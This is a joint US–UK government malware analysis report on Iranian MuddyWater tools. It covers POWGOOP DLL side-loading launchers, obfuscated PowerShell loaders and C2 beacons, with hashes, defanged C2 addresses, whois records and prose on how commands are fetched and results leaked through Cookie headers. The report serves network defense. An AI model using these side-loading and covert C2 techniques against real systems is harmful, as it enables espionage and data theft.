{
  "markdown": "\n\n\n\n\n\n\nNotification\n\nThis report is provided \"as is\" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained herein. The DHS does not endorse any commercial product or service referenced in this bulletin or otherwise.\nThis document is marked TLP:WHITE--Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol (TLP), see http://www.cisa.gov/tlp.\n\nSummary\n\nDescription\nThis Malware Analysis Report (MAR) is the result of analytic efforts by the Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the U.S. Cyber Command Cyber National Mission Force (CNMF), the United Kingdom\u2019s National Cyber Security Centre (NCSC-UK), and the National Security Agency (NSA) to provide detailed analysis of 23 files identified as MuddyWater tools. MuddyWater is a group of Iranian government-sponsored advanced persistent threat actors that conducts cyber espionage and other malicious cyber operations targeting a range of government and private-sector organizations across sectors\u2014including telecommunications, defense, local government, and oil and natural gas\u2014in Asia, Africa, Europe, and North America.\n\n\t\t\tFBI, CISA, CNMF, NCSC-UK, and NSA are distributing this MAR to enable network defense and reduce exposure to Iranian government malicious cyber activity. For more information on malicious Iranian government cyber activity, visit CISA's webpage at https://www.cisa.gov/uscert/iran.\n\n\t\t\tOf the 23 malware samples analyzed, 14 files were identified as variants of the POWGOOP malware family. Two files were identified as JavaScript files that contain a PowerShell beacon. One file was identified as a Mori backdoor sample. Two malicious Microsoft Excel spreadsheets were identified as Canopy malware (also known as Starwhale) that contained macros and two encoded Windows script files, which maintain persistence and collect and exfiltrate the victim's system data to a command and control (C2).\n\n\t\t\tThe POWGOOP samples were discovered as Windows executables (not included this report) and contain three components:\n\n\t\t\t1) \u00a0\u00a0\u00a0A dynamic-link library (DLL) file renamed as a legitimate filename to enable the DLL side-loading technique.\n\t\t\t2) \u00a0\u00a0\u00a0An obfuscated PowerShell script, obfuscated as a .dat file used to decrypt a file named \"config.txt.\"\n\t\t\t3) \u00a0\u00a0\u00a0An encoded PowerShell script, obfuscated as a text file containing a beacon to a hardcoded Internet Protocol (IP) address.\n\n\t\t\tThese components retrieve encrypted commands from a C2 server. The command is decrypted on the victim machine and piped into a PowerShell command, sending the results of the command in the Cookie parameter of the return traffic, using the same encryption/Base64 encoding routine.\n\u00a0\nFor a downloadable copy of IOCs, see: MAR-10369127-1.v1.stix.\nClick here\u00a0for a PDF version of this report.\nSubmitted Files (19)\n026868713d60e6790f41dc7046deb4e6795825faa903113d2f22b644f0d21141 (Cooperation terms.xls)\n12db8bcee090521ecf852bf215ce3878737517a22ef1f2ff9bdec7cba8d0d3aa (goopdate.dll)\n2471a039cb1ddeb826f3a11f89b193624d89052afcbee01205dc92610723eb82 (goopdate.dat)\n255e53af8b079c8319ce52583293723551da9affe547da45e2c1d4257cff625a (TeresitaJordain_config.txt)\n3098dd53da40947a82e59265a47059e69b2925bc49c679e6555d102d1c6cbbc8 (FML.dll)\n42ca7d3fcd6d220cd380f34f9aa728b3bb68908b49f04d04f685631ee1f78986 (rj.js)\n4b2862a1665a62706f88304406b071a5c9a6b3093daadc073e174ac6d493f26c (ZaibCb15Ak.xls)\n5bcdd422089ed96d6711fa251544e2e863b113973db328590cfe0457bfeb564f (Config2.txt)\n7e7545d14df7b618b3b1bc24321780c164a0a14d3600dbac0f91afbce1a2f9f4 (Dore.dat)\n9cb79736302999a7ec4151a43e93cd51c97ede879194cece5e46b4ff471a7af7 (Config.txt)\n9d50fcb2c4df4c502db0cac84bef96c2a36d33ef98c454165808ecace4dd2051 (libpcre2-8-0.dll)\n9ec8319e278d1b3fa1ccf87b5ce7dd6802dac76881e4e4e16e240c5a98f107e2 (AntheHannah_config.txt)\nb1e30cce6df16d83b82b751edca57aa17795d8d0cdd960ecee7d90832b0ee76c (note.js)\nb5b1e26312e0574464ddef92c51d5f597e07dba90617c0528ec9f494af7e8504 (Core.dat)\nb6133e04a0a1deb8faf944dd79c46c62f725a72ea9f26dd911d6f6e1e4433f1a (config.txt)\nce9bd1acf37119ff73b4dff989f2791eb24efc891a413df58856d848f0bcaee9 (config.txt)\ndd7ee54b12a55bcc67da4ceaed6e636b7bd30d4db6f6c594e9510e1e605ade92 (vcruntime140.dll)\ne7baf353aa12ff2571fc5c45184631dc2692e2f0a61b799e29a1525969bf2d13 (Core.dat)\ne7f6c7b91c482c12fc905b84dbaa9001ef78dc6a771773e1de4b8eade5431eca (HeidieLeone.txt)\nAdditional Files (4)\nc2badcdfa9b7ece00f245990bb85fb6645c05b155b77deaf2bb7a2a0aacbe49e (Outlook.wsf)\nd77e268b746cf1547e7ed662598f8515948562e1d188a7f9ddb8e00f4fd94ef0 (Outlook.wsf)\ned988768f50f1bb4cc7fb69f9633d6185714a99ecfd18b7b1b88a42a162b0418 (Outlook.wsf)\nf10471e15c6b971092377c524a0622edf4525acee42f4b61e732f342ea7c0df0 (Outlook.wsf)\nIPs (7)\n185.117.75.34\n185.118.164.21\n185.183.96.44\n185.183.96.7\n192.210.191.188\n5.199.133.149\n88.119.170.124\n\nFindings\n\n12db8bcee090521ecf852bf215ce3878737517a22ef1f2ff9bdec7cba8d0d3aa\nTags\ntrojan\nDetails\n\n\n\nName\ngoopdate.dll\n\n\nSize\n90624 bytes\n\n\nType\nPE32 executable (DLL) (console) Intel 80386, for MS Windows\n\n\nMD5\na27655d14b0aabec8db70ae08a623317\n\n\nSHA1\n8344f2c1096687ed83c2bbad0e6e549a71b0c0b1\n\n\nSHA256\n12db8bcee090521ecf852bf215ce3878737517a22ef1f2ff9bdec7cba8d0d3aa\n\n\nSHA512\n3c9fa512e7360fecc4db3196e850db8b398d1950a21a3a1f529bbc0a1323cc3b4c8d1bf95acb9ceaa794cf135a56c0e761976f17326594ce08c89117b1700514\n\n\nssdeep\n1536:Ggw+CKmmOmwE1k4XGt2EkxtNh7aZgvADsW/cd+32UVGHgz:RCBTDE1krt2Ebg5+32UQHgz\n\n\nEntropy\n6.359392\n\n\n\nAntivirus\n\n\n\nESET\na variant of Win32/Agent.ACHN trojan\n\n\nSymantec\nTrojan Horse\n\n\nTrend Micro\nTrojan.928E7209\n\n\nTrend Micro HouseCall\nTrojan.928E7209\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2020-09-23 02:02:48-04:00\n\n\nImport Hash\n132491700659f9b56970a9b12cbbb348\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\ndbe1463d7d1b0850df5e47b5320ef5fb\nheader\n1024\n2.757475\n\n\nc732c8e6ad0cf8292aa60a9da9dcbe7c\n.text\n54784\n6.609888\n\n\n3bd80fc1bbd1476e125d2e487662e01f\n.rdata\n27648\n5.042288\n\n\nccd03992b1a52aba460a01a4113d59c8\n.data\n2560\n2.366593\n\n\nc7a4e8ec050a078d37fff5197af953e2\n.rsrc\n512\n4.712298\n\n\n2de65738f49b99cdb71355bdc924c55a\n.reloc\n4096\n6.411331\n\n\n\nPackers/Compilers/Cryptors\n\n\n\nBorland Delphi 3.0 (???)\n\n\n\nRelationships\n\n\n\n12db8bcee0...\nRelated_To\n2471a039cb1ddeb826f3a11f89b193624d89052afcbee01205dc92610723eb82\n\n\n\nDescription\nThis file was identified as a launcher and is contained within an executable \"GoogleUpdate.exe\" (not included in this submission). The DLL is renamed as a legitimate filename \"goopdate.dll\" to enable a DLL side-loading technique. Note: goopdate.dll is the name of a module belonging to Goopdate from Google Inc. The DLL side-loading technique is used to rename a malicious DLL to the name of a dependent file of a legitimate executable in order to execute its malicious code. For this variant, GoogleUpdate.exe depends on a legitimate file \u2018goopdate.dll\u2019. The malicious POWGOOP DLL is therefore renamed goopdate.dll to force GoogleUpdate.exe to execute the malicious code, which spawns a Rundll32.exe process to launch goopdate.dll with the DllRegisterServer function (Figure 1). This results in a PowerShell script, a \"goopdate.dat\" file (2471a039cb1ddeb826f3a11f89b193624d89052afcbee01205dc92610723eb82) decrypting a co-located \"config.txt\" file (ce9bd1acf37119ff73b4dff989f2791eb24efc891a413df58856d848f0bcaee9), another obfuscated PowerShell script containing the C2 beacon.\nScreenshots\n \n\nFigure 1 - Screenshot of GoogleUpdate.exe spawning a Rundll32.exe process to launch goopdate.dll with the DllRegisterServer function.\n\n \n\nFigure 2 - Screenshot of the PowerShell script being decrypted.\n\n\n\n2471a039cb1ddeb826f3a11f89b193624d89052afcbee01205dc92610723eb82\nDetails\n\n\n\nName\ngoopdate.dat\n\n\nSize\n115546 bytes\n\n\nType\ndata\n\n\nMD5\n218d4151b39e4ece13d3bf5ff4d1121b\n\n\nSHA1\n28e799d9769bb7e936d1768d498a0d2c7a0d53fb\n\n\nSHA256\n2471a039cb1ddeb826f3a11f89b193624d89052afcbee01205dc92610723eb82\n\n\nSHA512\n8f859945f0c3e590db99bb35f4127f34910268c44f94407e98a5399fec44d92523d07230e793209639914afe61d17dfb41273193e30bbfb950b29ffce3d4b9d5\n\n\nssdeep\n3072:bI+Rz2t2VGAQIP2DR7mOOfKI12sKDrS51ODTKjI2:bpF2t2VV2DNmOOyI8s441FjI\n\n\nEntropy\n7.971267\n\n\n\nAntivirus\n\n\n\nBitdefender\nGeneric.Exploit.Donut.2.5DE6F72C\n\n\nEmsisoft\nGeneric.Exploit.Donut.2.5DE6F72C (B)\n\n\nLavasoft\nGeneric.Exploit.Donut.2.5DE6F72C\n\n\nSophos\nATK/DonutLdr-A\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\n2471a039cb...\nRelated_To\nce9bd1acf37119ff73b4dff989f2791eb24efc891a413df58856d848f0bcaee9\n\n\n2471a039cb...\nRelated_To\n12db8bcee090521ecf852bf215ce3878737517a22ef1f2ff9bdec7cba8d0d3aa\n\n\n\nDescription\nThis file was identified as an obfuscated PowerShell script and is contained within an executable \"GoogleUpdate.exe\" (not included in this submission). This obfuscated PowerShell script is used to decode and run the additional obfuscated PowerShell script \"config.txt\" (ce9bd1acf37119ff73b4dff989f2791eb24efc891a413df58856d848f0bcaee9).\nScreenshots\n \n\nFigure 3 - Screenshot of the de-obfuscated PowerShell script.\n\n\n\nce9bd1acf37119ff73b4dff989f2791eb24efc891a413df58856d848f0bcaee9\nDetails\n\n\n\nName\nconfig.txt\n\n\nSize\n3364 bytes\n\n\nType\ndata\n\n\nMD5\n52299ffc8373f58b62543ec754732e55\n\n\nSHA1\nca97ac295b2cd57501517c0efd67b6f8a7d1fbdf\n\n\nSHA256\nce9bd1acf37119ff73b4dff989f2791eb24efc891a413df58856d848f0bcaee9\n\n\nSHA512\n6c9dc3ae0d3090bab57285ac1bc86d0fa60096221c99a383cc1a5a7da1c0614dfdbe4e6fa2aea9ff1e8d3415495d2d444c2f15ad9a1fd3847ddb0fc721f101a2\n\n\nssdeep\n48:oN/rGOTDwOQ0rSt4tD9f+1o09KP/iyrjfODVosSh9lwrjhChwsFKDUGymwx:qroOlfBPz5sSh+w9v\n\n\nEntropy\n5.346853\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\nce9bd1acf3...\nRelated_To\n2471a039cb1ddeb826f3a11f89b193624d89052afcbee01205dc92610723eb82\n\n\nce9bd1acf3...\nConnected_To\n185.183.96.7\n\n\n\nDescription\nThis file was identified as an encrypted PowerShell script and is contained within an executable \"GoogleUpdate.exe\" (not included in this submission). This PowerShell script is decoded by \"goopdate.dat\" (2471a039cb1ddeb826f3a11f89b193624d89052afcbee01205dc92610723eb82) and contains a beacon to the following hardcoded IP address:\n\n\t\t\t--Begin C2 IP address--\n\t\t\t185[.]183[.]96[.]7:443/index.php\n\t\t\t--End C2 IP address--\n\n\t\t\tThe malware used the hardcoded C2 to pass remote commands to the victim machine. The encrypted commands are decrypted on the victim machine and piped into a PowerShell command, sending the results of the command in the Cookie parameter of the return traffic, using the same encryption/Base64 encoding routine.\n\n\t\t\tThe script uses 1-3 randomly generated human names as variables and function names (Figure 4). The script uses a modified Base64 routine adding or subtracting by 2, using two consecutive functions (Base64Dec, QueenieSusanneAvril) to decrypt remote commands to execute locally and two consecutive functions (Marlie, Kassandra) to encrypt the result and pass to the \u201cCookie:\u201d parameter to be passed back to the C2 node.\n\n\t\t\tThe config.txt can be run separately as a .ps1 PowerShell script to execute the de-obfuscated code, which results in the victim machine pulling down any command the threat actor places in the index.php file located at 185[.]183[.]96[.]7:443 (ie. 'whoami') and executes locally on the victim machine. The script exfiltrates the result of the command in a Base64 encoded string passed through the 'Cookie: <Base64_encoded_string>' part of the packet (Figure 6).\nScreenshots\n \n\nFigure 4 - Screenshot of the script.\n\n \n\nFigure 5 - Screenshot of the GET request sent over port 443 for \"index.php\" from the IP address 185[.]183[.]96[.]7.\n\n \n\nFigure 6 - Screenshot of the GET request.\n\n\n\n185.183.96.7\nTags\ncommand-and-control\nURLs\n\n185.183.96.7/index.php\n\nPorts\n\n443 TCP\n\nWhois\nQueried whois.ripe.net with \"-B 185.183.96.7\"...\n\n\t\t\t% Information related to '185.183.96.0 - 185.183.96.255'\n\n\t\t\t% Abuse contact for '185.183.96.0 - 185.183.96.255' is 'abuse@hostsailor.com'\n\n\t\t\tinetnum: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0185.183.96.0 - 185.183.96.255\n\t\t\tnetname: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0EU-HOSTSAILOR\n\t\t\tdescr: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 HostSailor NL Services\n\t\t\tcountry: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0NL\n\t\t\tadmin-c: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0AA31720-RIPE\n\t\t\ttech-c: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 AA31720-RIPE\n\t\t\tstatus: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ASSIGNED PA\n\t\t\tmnt-by: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 MNT-HS\n\t\t\tcreated: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02016-12-23T09:52:06Z\n\t\t\tlast-modified: 2016-12-23T09:52:06Z\n\t\t\tsource: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 RIPE\n\n\t\t\tperson: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Ali Al-Attiyah\n\t\t\taddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Suite No: 1605, Churchill Executive Tower, Burf Khalifa Area\n\t\t\taddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Dubai P.O. Box 98362\n\t\t\taddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0United Arab Emirates\n\t\t\tphone: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 +971 455 77 845\n\t\t\tnic-hdl: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0AA31720-RIPE\n\t\t\tmnt-by: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 MNT-HS\n\t\t\tcreated: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02016-12-21T19:19:26Z\n\t\t\tlast-modified: 2019-03-18T14:07:12Z\n\t\t\tsource: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 RIPE\n\n\t\t\t% Information related to '185.183.96.0/24AS60117'\n\n\t\t\troute: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 185.183.96.0/24\n\t\t\tdescr: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 EU-HOSTSAILOR 185.183.96.0/24\n\t\t\torigin: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 AS60117\n\t\t\tmnt-by: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 MNT-HS\n\t\t\tcreated: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02016-12-23T09:50:04Z\n\t\t\tlast-modified: 2016-12-23T09:50:04Z\n\t\t\tsource: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 RIPE\nRelationships\n\n\n\n185.183.96.7\nConnected_From\nce9bd1acf37119ff73b4dff989f2791eb24efc891a413df58856d848f0bcaee9\n\n\n\nDescription\nconfig.txt (ce9bd1acf37119ff73b4dff989f2791eb24efc891a413df58856d848f0bcaee9) attempts to connect to this IP address.\n\n\n9d50fcb2c4df4c502db0cac84bef96c2a36d33ef98c454165808ecace4dd2051\nTags\ntrojan\nDetails\n\n\n\nName\nlibpcre2-8-0.dll\n\n\nSize\n96768 bytes\n\n\nType\nPE32 executable (DLL) (console) Intel 80386, for MS Windows\n\n\nMD5\n860f5c2345e8f5c268c9746337ade8b7\n\n\nSHA1\n6c55d3acdc2d8d331f0d13024f736bc28ef5a7e1\n\n\nSHA256\n9d50fcb2c4df4c502db0cac84bef96c2a36d33ef98c454165808ecace4dd2051\n\n\nSHA512\n15b758ada75ae3a6848e3e528e07b19e0efb4156105f0e2ff4486c6df35574c63ccaae5e00d3c4f1ac3f5032f3eb5732179d187979779af4658e8e4dc5020f9f\n\n\nssdeep\n1536:TjdtPuB/MpXu7QeqqPKaSc9/Sc+Amru3xobZFsWo/dcd+0Q+MoOl5:TfuBwXuUeqqPIkSc4u3xobb+0Q+MRl5\n\n\nEntropy\n6.397339\n\n\n\nAntivirus\n\n\n\nESET\na variant of Win32/Agent.ADJB trojan\n\n\nVirusBlokAda\nBScope.Trojan.Agentb\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2020-10-05 03:59:42-04:00\n\n\nImport Hash\n412395ba322a0d1b557db71f338aadde\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\nb474b7d68214633e93dc1ab3fcad9a4b\nheader\n1024\n2.769462\n\n\nd9e1cff126e23d40d396bebc0fe103be\n.text\n55296\n6.612472\n\n\n8528c24241b97c45d2f90f3ef1baceec\n.rdata\n33280\n5.178997\n\n\n96565e257370e82ea6cc20bdc7831a7b\n.data\n2560\n2.380258\n\n\n43041985e356ec1bb76514dd6d7a347f\n.rsrc\n512\n4.717679\n\n\n6b5a16c382d161788b9cc48d74f91543\n.reloc\n4096\n6.435504\n\n\n\nPackers/Compilers/Cryptors\n\n\n\nBorland Delphi 3.0 (???)\n\n\n\nDescription\nThis file was identified as a launcher and is renamed as a legitimate filename \"libpcre2-8-0.dll\" to enable a DLL side-loading technique. Note: libpcre2-8-0.dll is a library for Mingw-w64, an open source software development environment. This file has similar capabilities as \"goopdate.dll\" (12db8bcee090521ecf852bf215ce3878737517a22ef1f2ff9bdec7cba8d0d3aa).\n\n\ndd7ee54b12a55bcc67da4ceaed6e636b7bd30d4db6f6c594e9510e1e605ade92\nTags\ntrojan\nDetails\n\n\n\nName\nvcruntime140.dll\n\n\nSize\n93696 bytes\n\n\nType\nPE32 executable (DLL) (console) Intel 80386, for MS Windows\n\n\nMD5\ncec48bcdedebc962ce45b63e201c0624\n\n\nSHA1\n81f46998c92427032378e5dead48bdfc9128b225\n\n\nSHA256\ndd7ee54b12a55bcc67da4ceaed6e636b7bd30d4db6f6c594e9510e1e605ade92\n\n\nSHA512\n661a59b4cdb4aab652b24cb9b7ca54cdee1d50ac3b0479cb418cf8ec2f7bda15fcc2622e6b08a784187ec3f43acd678d1d73efacd43ac33501963d5e4dfe32e9\n\n\nssdeep\n1536:jjevM3civEZfW15lbrWKIAy4pcd8uHxQEbZFsWo/dcdV0yjHe9c0b5i2MUql5:jzcbfO5lbr6Ay4huHxHbbV0eHe9c0b5I\n\n\nEntropy\n6.386276\n\n\n\nAntivirus\n\n\n\nAhnLab\nTrojan/Win.Generic\n\n\nAvira\nTR/Agent.fizgi\n\n\nBitdefender\nTrojan.GenericKD.37827502\n\n\nESET\na variant of Win32/Agent.ADJB trojan\n\n\nEmsisoft\nTrojan.GenericKD.37827502 (B)\n\n\nIKARUS\nTrojan.Win32.Agent\n\n\nK7\nTrojan ( 005893651 )\n\n\nLavasoft\nTrojan.GenericKD.37827502\n\n\nMcAfee\nRDN/Generic.dx\n\n\nSymantec\nTrojan.Gen.MBT\n\n\nVirusBlokAda\nBScope.Trojan.Agentb\n\n\nZillya!\nTrojan.Agent.Win32.2507968\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2020-10-11 08:50:42-04:00\n\n\nImport Hash\n99474d9cfb6d6c2c0eada954b5521471\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\n644538127a7d5372f16bbc62790e1b5d\nheader\n1024\n2.778786\n\n\n46d87fd65afee2330ee32fe404fe7657\n.text\n55808\n6.623812\n\n\n7bc20c2666aeb10cbe1787cdeeb38138\n.rdata\n29696\n5.111049\n\n\n8adf7f42b993b6d8b658ea5a9d554a49\n.data\n2560\n2.380664\n\n\n065463fcb19d087772450d47229f013f\n.rsrc\n512\n4.717679\n\n\n1a870fa886d593f0dd1c9ce8816c3a63\n.reloc\n4096\n6.466938\n\n\n\nPackers/Compilers/Cryptors\n\n\n\nBorland Delphi 3.0 (???)\n\n\n\nDescription\nThis file was identified as a launcher and is renamed as a legitimate filename \"vcruntime140.dll\" to enable a DLL side-loading technique. Note: vcruntime140.dll is a runtime library for Microsoft Visual Studio. This file has similar capabilities as \"goopdate.dll\" (12db8bcee090521ecf852bf215ce3878737517a22ef1f2ff9bdec7cba8d0d3aa).\n\n\nb5b1e26312e0574464ddef92c51d5f597e07dba90617c0528ec9f494af7e8504\nDetails\n\n\n\nName\nCore.dat\n\n\nSize\n222554 bytes\n\n\nType\ndata\n\n\nMD5\na65696d6b65f7159c9ffcd4119f60195\n\n\nSHA1\n570f7272412ff8257ed6868d90727a459e3b179e\n\n\nSHA256\nb5b1e26312e0574464ddef92c51d5f597e07dba90617c0528ec9f494af7e8504\n\n\nSHA512\n65661ca585e10699eaded4f722914c79b5922e93ea4ca8ecae4a8e3f1320e7b806996f7a54dffbe9d1cdeda593f08e8d95cd831d57de9d9568ea6d8bd280988b\n\n\nssdeep\n6144:AD5ss4qHWpWYY3X3YxMNkpMj7vl+AQOjI:Uss4QEWYwYxM+CdZ3\n\n\nEntropy\n7.990578\n\n\n\nAntivirus\n\n\n\nBitdefender\nGeneric.Exploit.Donut.2.50F4F7F0\n\n\nEmsisoft\nGeneric.Exploit.Donut.2.50F4F7F0 (B)\n\n\nLavasoft\nGeneric.Exploit.Donut.2.50F4F7F0\n\n\nSophos\nATK/DonutLdr-A\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file was identified as an obfuscated PowerShell script and is used to decode and run an additional obfuscated PowerShell script. This file is similar to goopdate.dat (2471a039cb1ddeb826f3a11f89b193624d89052afcbee01205dc92610723eb82).\n\n\ne7baf353aa12ff2571fc5c45184631dc2692e2f0a61b799e29a1525969bf2d13\nDetails\n\n\n\nName\nCore.dat\n\n\nSize\n222554 bytes\n\n\nType\ndata\n\n\nMD5\n4a022ea1fd2bf5e8c0d8b2343a230070\n\n\nSHA1\n89df0feca9a447465d41ac87cb45a6f3c02c574d\n\n\nSHA256\ne7baf353aa12ff2571fc5c45184631dc2692e2f0a61b799e29a1525969bf2d13\n\n\nSHA512\nbec85adf79b916ee64c4a4b6f2cf60d8321d7394a2ec299c3547160f552ecae403c6a2a9aa669cf789d4d99b01c637ac1d0da3c9ed8872bb6184b5ad9543d580\n\n\nssdeep\n6144:HzUl+nQWOJ0h0Q+MhozbM8RTVwS9HTkSaRIJjI:HzNQkC06bZuSBTky\n\n\nEntropy\n7.990584\n\n\n\nAntivirus\n\n\n\nBitdefender\nGeneric.Exploit.Donut.2.B85DA16C\n\n\nEmsisoft\nGeneric.Exploit.Donut.2.B85DA16C (B)\n\n\nLavasoft\nGeneric.Exploit.Donut.2.B85DA16C\n\n\nSophos\nATK/DonutLdr-A\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file was identified as an obfuscated PowerShell script and is used to decode and run an additional obfuscated PowerShell script. This file is similar to goopdate.dat (2471a039cb1ddeb826f3a11f89b193624d89052afcbee01205dc92610723eb82).\n\n\n7e7545d14df7b618b3b1bc24321780c164a0a14d3600dbac0f91afbce1a2f9f4\nTags\ntrojan\nDetails\n\n\n\nName\nDore.dat\n\n\nSize\n208222 bytes\n\n\nType\nPE32 executable (GUI) Intel 80386, for MS Windows\n\n\nMD5\n6c084c8f5a61c6bec5eb5573a2d51ffb\n\n\nSHA1\n61608ed1de56d0e4fe6af07ecba0bd0a69d825b8\n\n\nSHA256\n7e7545d14df7b618b3b1bc24321780c164a0a14d3600dbac0f91afbce1a2f9f4\n\n\nSHA512\n4eaa2d6f29d2712f3487ff7e3a463ec4ba711ba36edda422db126840282e8705ebee6304cc9a54433c7fac7759f98a9543eda881726d8b788f4487b8d4f42423\n\n\nssdeep\n6144:LiJOsC/WBmefvpzeChVsg3euJHs7pdcAOlnI:LLWBmyvp/s5uJHs7pdcvI\n\n\nEntropy\n6.489815\n\n\n\nAntivirus\n\n\n\nAvira\nHEUR/AGEN.1144435\n\n\nBitdefender\nGeneric.Exploit.Shellcode.PE.1.A192654B\n\n\nESET\nPowerShell/Runner.AA trojan\n\n\nEmsisoft\nGeneric.Exploit.Shellcode.PE.1.A192654B (B)\n\n\nIKARUS\nTrojan.PowerShell.Runner\n\n\nK7\nRiskware ( 0040eff71 )\n\n\nLavasoft\nGeneric.Exploit.Shellcode.PE.1.A192654B\n\n\nSophos\nMal/Swrort-Y\n\n\nSymantec\nTrojan Horse\n\n\nVirusBlokAda\nBScope.Trojan.Wacatac\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2020-10-11 08:50:37-04:00\n\n\nImport Hash\nec0fa343230fe2524df352e5e73f52a2\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\n57e428c7f6e8430e0380e9a1681a940c\nheader\n1024\n2.806123\n\n\n89eb652b81f7b3cd7e9ee9e718575c09\n.text\n135168\n6.614331\n\n\n4f6c6295c85743cc3a2ca8f5dc2c4648\n.rdata\n58368\n5.330927\n\n\n3fe517cfbe9700ed9c311661377fcbd9\n.data\n4096\n3.056628\n\n\n7d123d6987b6fa0f191e9ee2fb0d9484\n.rsrc\n512\n4.711341\n\n\n320df1e8ed4184af06bb4c62a00cc47b\n.reloc\n8704\n6.441951\n\n\n\nPackers/Compilers/Cryptors\n\n\n\nMicrosoft Visual C++ ?.?\n\n\n\nDescription\nThis file was identified as an obfuscated PowerShell script and is used to decode and run an additional obfuscated PowerShell script. This file is similar to goopdate.dat (2471a039cb1ddeb826f3a11f89b193624d89052afcbee01205dc92610723eb82).\n\n\nb6133e04a0a1deb8faf944dd79c46c62f725a72ea9f26dd911d6f6e1e4433f1a\nDetails\n\n\n\nName\nconfig.txt\n\n\nSize\n3615 bytes\n\n\nType\ndata\n\n\nMD5\nb6b0edf0b31bc95a042e13f3768a65c3\n\n\nSHA1\n5168a8880abe8eb2d28f10787820185fe318859e\n\n\nSHA256\nb6133e04a0a1deb8faf944dd79c46c62f725a72ea9f26dd911d6f6e1e4433f1a\n\n\nSHA512\n669e655ca79c95d8d25e56cb0c4c71574ff74f55e11930e9cdbfb4a3767fce0d09ab362d2f188a153ba25497b8a2508d0501bca342c0558f06e921f603b2218c\n\n\nssdeep\n48:oOd/U/82KlaUdrSS1A82RBBboWuP7qgGgmzfBUXX7PXTWPJJ5wx:YmP71+Ju\n\n\nEntropy\n5.291145\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\nb6133e04a0...\nConnected_To\n185.117.75.34\n\n\n\nDescription\nThis file was identified as an encrypted PowerShell script; it contains a beacon to the following hardcoded IP address:\n\n\t\t\t--Begin C2 IP address--\n\t\t\t185[.]117[.]75[.]34\n\t\t\t--End C2 IP address--\n\n\t\t\tThis file has similar capabilities as config.txt (ce9bd1acf37119ff73b4dff989f2791eb24efc891a413df58856d848f0bcaee9).\n\n\n185.117.75.34\nTags\ncommand-and-control\nPorts\n\n443 TCP\n\nWhois\nQueried whois.ripe.net with \"-B 185.117.75.34\"...\n\n\t\t\t% Information related to '185.117.75.0 - 185.117.75.255'\n\n\t\t\t% Abuse contact for '185.117.75.0 - 185.117.75.255' is 'abuse@hostsailor.com'\n\n\t\t\tinetnum: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0185.117.75.0 - 185.117.75.255\n\t\t\tnetname: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0EU-HOSTSAILOR-20140124\n\t\t\tdescr: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 HostSailor NL Services\n\t\t\tcountry: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0NL\n\t\t\tadmin-c: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0AF11712-RIPE\n\t\t\ttech-c: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 AF11712-RIPE\n\t\t\tstatus: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ASSIGNED PA\n\t\t\tmnt-by: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 MNT-HS\n\t\t\tcreated: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02016-02-01T08:50:02Z\n\t\t\tlast-modified: 2016-02-01T08:50:02Z\n\t\t\tsource: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 